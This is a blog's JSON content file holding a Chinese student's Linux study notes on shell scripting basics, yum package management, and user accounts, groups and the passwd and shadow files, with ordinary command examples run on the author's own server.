{"meta":{"title":"huhu","subtitle":"myhの博客","description":"本科 | 软件工程 | 网络安全","author":"huhu","url":"https://huhu-myh.github.io","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.080Z","comments":true,"path":"404.html","permalink":"https://huhu-myh.github.io/404.html","excerpt":"","text":""},{"title":"","date":"2022-01-13T11:49:03.178Z","updated":"2022-01-13T11:49:03.178Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"https://huhu-myh.github.io/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2022-01-13T11:49:03.180Z","updated":"2022-01-13T11:49:03.180Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"https://huhu-myh.github.io/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"about","date":"2022-01-13T16:00:00.000Z","updated":"2022-01-14T03:04:02.974Z","comments":true,"path":"about/index.html","permalink":"https://huhu-myh.github.io/about/index.html","excerpt":"","text":""},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/index.html","permalink":"https://huhu-myh.github.io/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-13T11:49:03.178Z","comments":true,"path":"archives/index.html","permalink":"https://huhu-myh.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-13T11:49:03.179Z","comments":true,"path":"categories/index.html","permalink":"https://huhu-myh.github.io/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2022-01-13T11:49:03.180Z","comments":true,"path":"friends/index.html","permalink":"https://huhu-myh.github.io/friends/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-14T01:37:55.640Z","comments":true,"path":"contact/index.html","permalink":"https://huhu-myh.github.io/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 myhの友链信息 博客名称: myhの博客 博客网址: https://huhu-myh.github.io/ 博客头像: https://t7.baidu.com/it/u=2674910008,1354282542&amp;fm=193?qq-pf-to=pcqq.c2c 博客介绍: The harder you work, the luckier you will be"},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2022-01-13T11:49:03.179Z","comments":true,"path":"census/index.html","permalink":"https://huhu-myh.github.io/census/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.181Z","comments":true,"path":"resource/index.html","permalink":"https://huhu-myh.github.io/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.182Z","comments":true,"path":"tags/index.html","permalink":"https://huhu-myh.github.io/tags/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/music/index.html","permalink":"https://huhu-myh.github.io/List/music/index.html","excerpt":"","text":""},{"title":"相册","date":"2022-01-13T11:49:03.085Z","updated":"2022-01-13T11:49:03.085Z","comments":true,"path":"List/galleries/index.html","permalink":"https://huhu-myh.github.io/List/galleries/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/tools/index.html","permalink":"https://huhu-myh.github.io/List/tools/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/movies/index.html","permalink":"https://huhu-myh.github.io/List/movies/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2022-01-13T11:49:03.085Z","updated":"2022-01-13T11:49:03.085Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2022-01-13T11:49:03.087Z","updated":"2022-01-13T11:49:03.087Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2022-01-13T11:49:03.088Z","updated":"2022-01-13T11:49:03.088Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2022-01-13T11:49:03.088Z","updated":"2022-01-13T11:49:03.088Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2022-01-13T11:49:03.087Z","updated":"2022-01-13T11:49:03.087Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2022-01-13T11:49:03.089Z","updated":"2022-01-13T11:49:03.089Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2022-01-13T11:49:03.089Z","updated":"2022-01-13T11:49:03.089Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2022-01-13T11:49:03.090Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2022-01-13T11:49:03.090Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""}],"posts":[{"title":"Linux学习-第九章","slug":"Linux学习-第九章","date":"2022-02-09T12:02:21.000Z","updated":"2022-02-10T12:46:44.934Z","comments":true,"path":"posts/myh10016.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10016.html","excerpt":"","text":"第九章：构建基本脚本9.1 使用多个命令shell脚本的关键在于输入多个命令并处理每个命令的结果，甚至需要将一个命令的结果传给另一个命令。 shell可以让你将多个命令串起来，一次执行完成。 如果要两个命令一起运行，可以把它们放在同一行中，彼此间用分号隔开： myh@VM-16-11-debian:~$ date;who Wed 09 Feb 2022 08:15:29 PM HKT myh pts/1 2022-02-09 20:00 (120.242.132.71) 这就是个简单的脚本，只用到了两个bash shell命令。 这种技术对于小型脚本尚可，但它有一个很大的缺陷：每次运行之前，你都必须在命令提示符下输入整个命令。可以将这些命令组合成一个简单的文本文件，这样就不需要在命令行中手动输入了。在需要运行这些命令时，只用运行这个文本文件就行了。 9.2 创建 shell 脚本文件在创建shell脚本文件touch test.sh时，必须在文件的第一行指定要使用的shell。其格式为： #!/bin/bash 在通常的shell脚本中，井号（ #）用作注释行。 shell并不会处理shell脚本中的注释行。然而，shell脚本文件的第一行是个例外， #后面的惊叹号会告诉shell用哪个shell来运行脚本。 在指定了shell之后，就可以在文件的每一行中输入命令，然后加一个回车符： !/bin/bash # This script displays the date and who's logged on date who 可以根据需要，使用分号将两个命令放在一行上，但在shell脚本中，你可以在独立的行中书写命令。 shell会按根据命令在文件中出现的顺序进行处理。 现在脚本就变写好了。如果直接运行结果可能不太好： $ test1 bash: test1: command not found 第一个障碍是让bash shell能找到你的脚本文件。 shell会通过PATH环境变量来查找命令。快速查看一下PATH环境变量就可以弄清问题所在。 $ echo $PATH /usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/bin:/usr/bin :/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/user/bin 让shell找到test1脚本，只需采取以下两种作法之一： 将shell脚本文件所处的目录添加到PATH环境变量中； 在提示符中用绝对或相对文件路径来引用shell脚本文件。 在这个例子中，我们将用第二种方式将脚本文件的确切位置告诉shell。记住，为了引用当前目录下的文件，可以在shell中使用单点操作符。 $ ./test1 bash: ./test1: Permission denied shell指明了还没有执行文件的权限。快速查看一下文件权限就能找到问题所在： $ ls -l test1 -rw-rw-r-- 1 user user 73 Sep 24 19:56 test1 下一步是通过chmod命令（参见第7章）赋予文件属主执行文件的权限 : root@VM-16-11-debian:/tmp/test# chmod 760 test1.sh root@VM-16-11-debian:/tmp/test# ./test1.sh Wed 09 Feb 2022 08:36:03 PM HKT myh pts/1 2022-02-09 20:00 (120.242.132.71) root@VM-16-11-debian:/tmp/test# ls -l total 12 -rw-r--r-- 1 root root 0 Jan 25 14:28 cho -rw-r--r-- 1 root root 22 Jan 25 14:29 makefile -rwxrw---- 1 root root 21 Feb 9 20:33 test1.sh -rw-r--r-- 1 myh root 76 Feb 8 20:32 test1.txt 9.3 显示消息echo命令可以显示文本消息来告诉脚本用户脚本正在做什么: !/bin/bash # This script displays the date and who's logged on echo This is a test. date who ​ 默认情况下，不需要使用引号将要显示的文本字符串划定出来。但有时在字符串中出现引号的话需要用另外一种来将字符串划定起来。 $ echo \"This is a test to see if you're paying attention\" This is a test to see if you're paying attention $ echo 'Rich says \"scripting is easy\".' Rich says \"scripting is easy\". 如果想把文本字符串和命令输出显示在同一行中，该怎么办呢？可以用echo语句的-n参数。只要将第一个echo语句改成这样就行： !/bin/bash # This script displays the date and who's logged on echo -n \"The time and date are: \" date echo -n \"Let's see who's logged into the system: \" who 输出如下： root@VM-16-11-debian:/tmp/test# ./test1.sh The time and data are: Wed 09 Feb 2022 08:52:32 PM HKT Let's see who's logged into the system: myh pts/1 2022-02-09 20:00 echo命令是shell脚本中与用户交互的重要工具。你会发现在很多地方都能用到它，尤其是需要显示脚本中变量的值的时候。 9.4 使用变量9.4.1 环境变量在环境变量名称之前加上美元符（ $）来使用这些环境变量: root@VM-16-11-debian:/tmp/test# cat test2.sh #!/bin/bash # Display the user information from the system. echo \"User info for userid: $USER\" echo UID: $UID echo HOME: $HOME root@VM-16-11-debian:/tmp/test# chmod 764 test2.sh root@VM-16-11-debian:/tmp/test# ls -l total 16 -rw-r--r-- 1 root root 0 Jan 25 14:28 cho -rw-r--r-- 1 root root 22 Jan 25 14:29 makefile -rwxrw---- 1 root root 106 Feb 9 20:52 test1.sh -rw-r--r-- 1 myh root 76 Feb 8 20:32 test1.txt -rwxrw-r-- 1 root root 127 Feb 10 19:45 test2.sh root@VM-16-11-debian:/tmp/test# ./test2.sh User info for userid: myh UID: 0 HOME: /root echo命令中的环境变量会在脚本运行时替换成当前值。 9.4.2 用户变量定义变量允许临时存储数据并在整个脚本中使用，从而使shell脚本看起来更像一个真正的计算机程序。 用户变量可以是： 任何由字母、数字或下划线组成的文本字符串，长度不超过20个。 区分大小写。 使用等号将值赋给用户变量。在变量、等号和值之间不能出现空格 shell脚本会自动决定变量值的数据类型。在脚本的整个生命周期里， shell脚本中定义的变量会一直保持着它们的值，但在shell脚本结束时会被删除掉。 root@VM-16-11-debian:/tmp/test# cat test3.sh #!/bin/bash #This is a test. name=myh echo \"$name love Linux!\" root@VM-16-11-debian:/tmp/test# ./test3.sh myh love Linux! 重要的是要记住，引用一个变量值时需要使用美元符，而引用变量来对其进行赋值时则不要使用美元符。 $ cat test4 #!/bin/bash # assigning a variable value to another variable value1=10 value2=$value1 echo The resulting value is $value2 9.4.3 命令替换从命令输出中提取信息，并将其赋给变量： 反引号字符（ `） $()格式 $ cat test5 #!/bin/bash testing=$(date) echo \"The date and time are: \" $testing 变量testing获得了date命令的输出，然后使用echo语句显示出它的值。运行这个shell脚本生成如下输出： $ ./test5 The date and time are: Mon Jan 31 20:10:25 EDT 2014 $ 下面这个例子很常见，它在脚本中通过命令替换获得当前日期并用它来生成唯一文件名： #!/bin/bash # copy the /usr/bin directory listing to a log file today=$(date +%y%m%d) ls /usr/bin -al &gt; log.$today today变量是被赋予格式化后的date命令的输出。这是提取日期信息来生成日志文件名常用的一种技术。 +%y%m%d格式告诉date命令将日期显示为两位数的年月日的组合。 root@VM-16-11-debian:/tmp/test# date +%y%m%d 220210 这个脚本将日期值赋给一个变量，之后再将其作为文件名的一部分。文件自身含有目录列表的重定向输出（将在9.5节详细讨论）。 -rw-r--r-- 1 user user 769 Jan 31 20:17 log.220210 日志文件采用$today变量的值作为文件名的一部分。日志文件的内容是/usr/bin目录内容的列表输出。如果脚本在明天运行，日志文件名会是log.140201，就这样为新的一天创建一个新文件。 9.5 重定向输入和输出bash shell提供了几个操作符，可以将命令的输出重定向到另一个位置（比如文件）。重定向可以用于输入，也可以用于输出，可以将文件重定向到命令输入。 9.5.1 输出重定向最基本的重定向将命令的输出发送到一个文件中。 bash shell用大于号（ &gt;）来完成这项功能： command &gt; outputfile 之前显示器上出现的命令输出会被保存到指定的输出文件中。 root@VM-16-11-debian:/tmp/test# date &gt; test4 root@VM-16-11-debian:/tmp/test# ls -l test4 -rw-r--r-- 1 root root 32 Feb 10 20:23 test4 root@VM-16-11-debian:/tmp/test# cat test4 Thu 10 Feb 2022 08:23:20 PM HKT 如果输出文件已经存在了，重定向操作符会用新的文件数据覆盖已有文件。 要将命令的输出追加到已有文件中 ，用双大于号（ &gt;&gt;）来追加数据： root@VM-16-11-debian:/tmp/test# who &gt;&gt; test4 root@VM-16-11-debian:/tmp/test# ls -l test4 -rw-r--r-- 1 root root 88 Feb 10 20:25 test4 root@VM-16-11-debian:/tmp/test# cat test4 Thu 10 Feb 2022 08:23:20 PM HKT myh pts/0 2022-02-10 19:42 9.5.2 输入重定向输入重定向将文件的内容重定向到命令，而非将命令的输出重定向到文件。 输入重定向符号是小于号（ &lt;）： command &lt; inputfile root@VM-16-11-debian:/tmp/test# wc &lt; test4 2 12 88 wc命令可以对对数据中的文本进行计数。默认情况下，它会输出3个值 ： 文本的行数 文本的词数 文本的字节数 9.6 管道将一个命令的输出作为另一个命令的输入可以用重定向来实现，但较为繁琐： root@VM-16-11-debian:/tmp/test# ls / &gt; test5.txt root@VM-16-11-debian:/tmp/test# cat test5.txt bin boot …… root@VM-16-11-debian:/tmp/test# sort &lt; test5.txt bin boot …… #可能这个例子不太合理之时演示大致意思 可以通过管道连接（ piping）| ： command1 | command2 Linux系统会同时运行这两个命令，在系统内部将它们连接起来。在第一个命令产生输出的同时，输出会被立即送给第二个命令。数据传输不会用到任何中间文件或缓冲区。 root@VM-16-11-debian:/tmp/test# ls / | sort bin boot data …… 可以搭配使用重定向和管道来将输出保存到文件中： $ rpm -qa | sort &gt; rpm.list $ more rpm.list abrt-1.1.14-1.fc14.i686 abrt-addon-ccpp-1.1.14-1.fc14.i686 abrt-addon-kerneloops-1.1.14-1.fc14.i686 到目前为止，管道最流行的用法之一是将命令产生的大量输出通过管道传送给more命令。这对ls命令来说尤为常见 ： ls -l命令产生了目录中所有文件的长列表。对包含大量文件的目录来说，这个列表会相当长。通过将输出管道连接到more命令，可以强制输出在一屏数据显示后停下来。 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"Linux学习-第八章","slug":"Linux学习-第八章","date":"2022-02-09T11:26:35.000Z","updated":"2022-02-09T12:13:09.066Z","comments":true,"path":"posts/myh10015.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10015.html","excerpt":"","text":"第八章：安装软件程序8.1 包管理基础软件包存储在服务器上，可以利用本地Linux系统上的PMS工具通过互联网访问。这些服务器称为仓库（ repository）。可以用PMS工具来搜索新的软件包，或者是更新系统上已安装软件包。 PMS利用一个数据库来记录各种相关内容： Linux系统上已安装了什么软件包； 每个包安装了什么文件； 每个已安装软件包的版本 软件包通常会依赖其他的包，为了前者能够正常运行，被依赖的包必须提前安装在系统中。PMS工具将会检测这些依赖关系，并在安装需要的包之前先安装好所有额外的软件包。 Linux中广泛使用的两种主要的PMS基础工具是dpkg和rpm。 8.2 基于 Debian 的系统dpkg命令是基于Debian系PMS工具的核心。包含在这个PMS中的其他工具有： apt-get apt-cache aptitude 8.3 基于 Red Hat 的系统 yum：在Red Hat和Fedora中使用。 urpm：在Mandriva中使用。 zypper：在openSUSE中使用。 8.3.1 列出已安装包找出系统上已安装的包 ： yum list installed 输出的信息可能会在屏幕上一闪而过，所以最好是将已安装包的列表重定向到一个文件中。可以用more或less命令（或一个GUI编辑器）按照需要查看这个列表。 yum list installed &gt; installed_software yum擅长找出某个特定软件包的详细信息： # yum list xterm Loaded plugins: langpacks, presto, refresh-packagekit Adding en_US to language list Available Packages xterm.i686 253-1.el6 可以通过一条简单的命令查看包是否已安装: # yum list installed xterm Loaded plugins: refresh-packagekit Error: No matching Packages to list 果需要找出系统上的某个特定文件属于哪个软件包，万能的yum可以做到！ #yum provides file_name # yum provides /etc/yum.conf Loaded plugins: fastestmirror, refresh-packagekit, security Determining fastest mirrors * base: mirror.web-ster.com * extras: centos.chi.host-engine.com * updates: mirror.umd.edu yum-3.2.29-40.el6.centos.noarch : RPM package installer/updater/manager Repo : base Matched from: Filename : /etc/yum.conf yum-3.2.29-43.el6.centos.noarch : RPM package installer/updater/manager Repo : updates Matched from: Filename : /etc/yum.conf yum-3.2.29-40.el6.centos.noarch : RPM package installer/updater/manager Repo : installed Matched from: Other : Provides-match: /etc/yum.conf 8.3.2 用 yum 安装软件在Linux系统上， #表明你是以root用户身份登录的。应该只有在运行管理性的任务时才临时切换到root用户（比如安装和更新软件）。 yum install package_name 8.3.3 用 yum 更新软件要列出所有已安装包的可用更新，输入如下命令： yum list updates 如果发现某个特定软件包需要更新，输入如下命令： yum update package_name 如果想对更新列表中的所有包进行更新，只要输入如下命令： yum update 8.3.4 用 yum 卸载软件只删除软件包而保留配置文件和数据文件，就用如下命令： yum remove package_name 要删除软件和它所有的文件，就用erase选项： yum erase package_name 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"Linux学习-第七章","slug":"Linux学习-第七章","date":"2022-02-06T11:55:19.000Z","updated":"2022-02-09T11:27:48.219Z","comments":true,"path":"posts/myh10014.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10014.html","excerpt":"","text":"第七章：理解Linux文件权限7.1 Linux 的安全性Linux安全系统的核心是用户账户。每个能进入Linux系统的用户都会被分配唯一的用户账户。用户对系统中各种对象的访问权限取决于他们登录系统时用的账户。 用户权限是通过创建用户时分配的用户ID（ User ID，通常缩写为UID）来跟踪的。 UID是数值，每个用户都有唯一的UID，但在登录系统时用的不是UID，而是登录名。 Linux系统使用特定的文件和工具来跟踪和管理系统上的用户账户。 7.1.1 /etc/passwd 文件Linux系统使用一个专门的文件来将用户的登录名匹配到对应的UID值。这个文件就是/etc/passwd文件，它包含了一些与用户有关的信息。 root@VM-16-11-debian:~# cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin …… root用户账户是Linux系统的管理员，固定分配给它的UID是0。就像上例中显示的， Linux系统会为各种各样的功能创建不同的用户账户，而这些账户并不是真的用户，这些账户叫作系统账户，是系统上运行的各种服务进程访问资源用的特殊账户。所有运行在后台的服务都需要用一个系统用户账户登录到Linux系统上 。 Linux为系统账户预留了500以下的UID值。有些服务甚至要用特定的UID才能正常工作。为普通用户创建账户时，大多数Linux系统会从500开始，将第一个可用UID分配给这个账户（并非所有的Linux发行版都是这样）。 etc/passwd文件的字段包含了如下信息： 登录用户名 用户密码 用户账户的UID（数字形式） 用户账户的组ID（ GID）（数字形式） 用户账户的文本描述（称为备注字段） 用户HOME目录的位置 用户的默认shell 出于安全，etc/passwd文件中的密码字段都被设置成了x，这并不是说所有的用户账户都用相同的密码。绝大多数Linux系统都将用户密码保存在另一个单独的文件中（叫作shadow文件，位置在/etc/shadow）。只有特定的程序（比如登录程序）才能访问这个文件。 /etc/passwd是一个标准的文本文件。可以用任何文本编辑器在/etc/password文件里直接进行用户管理（比如添加、修改或删除用户账户）。但这样做极其危险。如果/etc/passwd文件出现损坏，系统就无法读取它的内容了，这样会导致用户无法正常登录（即便是root用户）。 7.1.2 /etc/shadow 文件只有root用户才能访问/etc/shadow文件，这让它比起/etc/passwd安全许多 。 /etc/shadow文件为系统上的每个用户账户都保存了一条记录。记录就像下面这样： rich:$1$.FfcK0ns$f1UgiyHQ25wrB/hykCn020:11627:0:99999:7::: 与/etc/passwd文件中的登录名字段对应的登录名 加密后的密码 自上次修改密码后过去的天数密码（自1970年1月1日开始计算） 多少天后才能更改密码 多少天后必须更改密码 密码过期前提前多少天提醒用户更改密码 密码过期后多少天禁用用户账户 用户账户被禁用的日期（用自1970年1月1日到当天的天数表示） 预留字段给将来使用 使用shadow密码系统后， Linux系统可以更好地控制用户密码。可以控制用户多久更改一次密码，以及什么时候禁用该用户账户，如果密码未更新的话。 7.1.3 添加新用户向Linux系统添加新用户的主要工具是useradd ，可以一次性创建新用户账户及设置用户HOME目录结构。useradd命令使用系统的默认值以及命令行参数来设置用户账户。系统默认值被设置在/etc/default/useradd文件中。可以使用加入了-D选项的useradd命令查看所用Linux系统中的这些默认值。 root@VM-16-11-debian:~# /usr/sbin/useradd -D GROUP=100 HOME=/home INACTIVE=-1 EXPIRE= SHELL=/bin/sh SKEL=/etc/skel CREATE_MAIL_SPOOL=no 在创建新用户时，如果不在命令行中指定具体的值， useradd命令会使用-D选项显示的那些默认值。这个例子列出的默认值如下： 新用户会被添加到GID为100的公共组； 新用户的HOME目录将会位于/home/loginname； 新用户账户密码在过期后不会被禁用； 新用户账户未被设置过期日期； 新用户账户将bash shell作为默认shell； 系统会将/etc/skel目录下的内容复制到用户的HOME目录下； 系统为该用户账户在mail目录下创建一个用于接收邮件的文件。 倒数第二个值很有意思。 useradd命令允许管理员创建一份默认的HOME目录配置，然后把它作为创建新用户HOME目录的模板。这样就能自动在每个新用户的HOME目录里放置默认的系统文件。 root@VM-16-11-debian:~# ls -al /etc/skel total 20 drwxr-xr-x 2 root root 4096 Jan 10 2020 . drwxr-xr-x 89 root root 4096 Jan 28 14:47 .. -rw-r--r-- 1 root root 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 root root 3526 Apr 18 2019 .bashrc -rw-r--r-- 1 root root 807 Apr 18 2019 .profile 它们是bash shell环境的标准启动文件。系统会自动将这些默认文件复制到创建的每个用户的HOME目录。 参 数 描 述 -c comment 给新用户添加备注 -d home_dir 为主目录指定一个名字（如果不想用登录名作为主目录名的话） -e expire_date 用YYYY-MM-DD格式指定一个账户过期的日期 -f inactive_days 指定这个账户密码过期后多少天这个账户被禁用； 0表示密码一过期就立即禁用， 1表示 禁用这个功能 -g initial_group 指定用户登录组的GID或组名 -G group … 指定用户除登录组之外所属的一个或多个附加组 -k 必须和-m一起使用，将/etc/skel目录的内容复制到用户的HOME目录 -m 创建用户的HOME目录 -M 不创建用户的HOME目录（当默认设置里要求创建时才使用这个选项） -n 创建一个与用户登录名同名的新组 -r 创建系统账户 -p passwd 为用户账户指定默认密码 -s shell 指定默认的登录shell -u uid 为账户指定唯一的UID 默认情况下， useradd命令不会创建HOME目录，但是-m命令行选项会使其创建HOME目录。 useradd命令创建了新HOME目录，并将/etc/skel目录中的文件复制了过来: # useradd -m test # ls -al /home/test total 24 drwxr-xr-x 2 test test 4096 2010-09-23 19:01 . drwxr-xr-x 4 root root 4096 2010-09-23 19:01 .. -rw-r--r-- 1 test test 220 2010-04-18 21:51 .bash_logout -rw-r--r-- 1 test test 3103 2010-04-18 21:51 .bashrc -rw-r--r-- 1 test test 179 2010-03-26 08:31 examples.desktop -rw-r--r-- 1 test test 675 2010-04-18 21:51 .profile 此时没有给用户设置登陆密码，可以用命令：passwd test修改密码，之后就可以用这个密码登录了。这里注意使用useradd -p命令时，后面跟的必须是加密后的密码，形如上面rich的$1$.FfcK0ns$f1UgiyHQ25wrB/hykCn020$1$.FfcK0ns$f1UgiyHQ25wrB/hykCn020。 可以在-D选项后跟上一个指定的值来修改系统默认的新用户设置: 参 数 描述 -b default_home 更改默认的创建用户HOME目录的位置 -e expiration_date 更改默认的新账户的过期日期 -f inactive 更改默认的新用户从密码过期到账户被禁用的天数 -g group 更改默认的组名称或GID -s shell 更改默认的登录shell # useradd -D -s /bin/tsch # useradd -D GROUP=100 HOME=/home INACTIVE=-1 EXPIRE= SHELL=/bin/tsch SKEL=/etc/skel CREATE_MAIL_SPOOL=yes 现在， useradd命令会将tsch shell作为所有新建用户的默认登录shell。 7.1.4 删除用户userdel可以从系统中删除用户。默认情况下， userdel命令会只删除/etc/passwd文件中的用户信息，而不会删除系统中属于该账户的任何文件。 加上-r参数， userdel会删除用户的HOME目录以及邮件目录。 # /usr/sbin/userdel -r test # ls -al /home/test ls: cannot access /home/test: No such file or directory 7.1.5 修改用户 命令 描述 usermod 修改用户账户的字段，还可以指定主要组以及附加组的所属关系 passwd 修改已有用户的密码 chpasswd 从文件中读取登录名密码对，并更新密码 chage 修改密码的过期日期 chfn 修改用户账户的备注信息 chsh 修改用户账户的默认登录shell 1.usermodusermod命令能修改/etc/passwd文件中的大部分字段，只需用与想修改的字段对应的命令行参数就可以了。参数大部分跟useradd命令的参数一样（比如， -c修改备注字段， -e修改过期日期， -g修改默认的登录组）。除此之外，还有另外一些可能派上用场的选项： -l修改用户账户的登录名。 -L锁定账户，使用户无法登录。 -p修改账户的密码。 -U解除锁定，使用户能够登录。 2.passwd和chpasswd 改变用户密码的一个简便方法就是用passwd命令。 # passwd test Changing password for user test. New UNIX password: Retype new UNIX password: passwd: all authentication tokens updated successfully. -e选项能强制用户下次登录时修改密码。你可以先给用户设置一个简单的密码，之后再强制`在下次登录时改成他们能记住的更复杂的密码。 7.2 使用 Linux 组组权限允许多个用户对系统中的对象（比如文件、目录或设备等）共享一组共用的权限。 7.2.1 /etc/group 文件与用户账户类似，组信息也保存在系统的一个文件中。 /etc/group文件包含系统上用到的每个组的信息。下面是一些来自Linux系统上/etc/group文件中的典型例子： root:x:0:root bin:x:1:root,bin,daemon daemon:x:2:root,bin,daemon sys:x:3:root,bin,adm adm:x:4:root,adm,daemon rich:x:500: mama:x:501: katie:x:502: jessica:x:503: mysql:x:27: test:x:504: /etc/group文件有4个字段： 组名 组密码 GID 属于该组的用户列表 和UID一样， GID在分配时也采用了特定的格式。系统账户用的组通常会分配低于500的GID值，而用户组的GID则会从500开始分配。 千万不能通过直接修改/etc/group文件来添加用户到一个组，要用usermod命令（在7.1节中介绍过）。在添加用户到不同的组之前，首先得创建组。 7.2.2 创建新组groupadd命令可在系统上创建新组： # /usr/sbin/groupadd shared # tail /etc/group haldaemon:x:68: xfs:x:43: gdm:x:42: rich:x:500: mama:x:501: katie:x:502: jessica:x:503: mysql:x:27: test:x:504: shared:x:505: 在创建新组时，默认没有用户被分配到该组。 groupadd命令没有提供将用户添加到组中的选项，但可以用usermod命令来弥补这一点: # /usr/sbin/usermod -G shared rich # /usr/sbin/usermod -G shared test # tail /etc/group haldaemon:x:68: xfs:x:43: gdm:x:42: rich:x:500: mama:x:501: katie:x:502: jessica:x:503: mysql:x:27: test:x:504: shared:x:505:rich, test 警告 为用户账户分配组时要格外小心。如果加了-g选项，指定的组名会替换掉该账户的默认组。 